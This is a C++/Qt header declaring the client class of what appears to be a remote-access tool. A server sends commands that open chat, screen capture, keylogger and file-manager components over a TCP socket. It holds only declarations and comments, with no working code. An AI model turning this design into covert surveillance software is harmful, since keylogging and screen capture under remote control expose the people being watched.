#ifndef CLIENT_H
#define CLIENT_H

#include <QObject>
#include "tcpsocket.h"
#include "filemanager.h"
#include "tkey.h"
#include "chat.h"
#include "screencap.h"


//*************************************//
//*************************************//
//***     Client - Client Module    ***//
//***      Class Header File        ***//
//*************************************//
//*************************************//


//This class is the clients main class. It creates objects of other classes when they're needed and
//it also sets up their communication with the object of tcpsocket class.


//Inherits QObject class which is Qt's own class
class client : public QObject
{
    Q_OBJECT

    //Pointers of objects of other classes which are dynamically created when needed
    chat *cnew;
    QString name;
    screenCap *scnew;
    tkey *keyloggerPtr;
    fileManager *fmnew;

    tcpsocket *communicationSocket;  //Pointer of a socket object(which allows communication with the server)

    QObject *opened;  //Pointer to the only opened object

    void connectOpened(QObject *);  //This function connects the newly created object to the socket object

public:
    explicit client(QObject *parent = 0, tkey *klPtr = NULL);  //constructor
    void startClient();  //This function creates the socket object and starts the actual client
    void stopClient();   //This function closes the socket and deletes the object (Hard close)

signals:
    //Does not emit any signals

public slots:
    void onServerCommand(QByteArray);  //Creates and connects objects based on commands from the server
    void resetConnections(); //Resets all the connections between objects

};

#endif // CLIENT_H
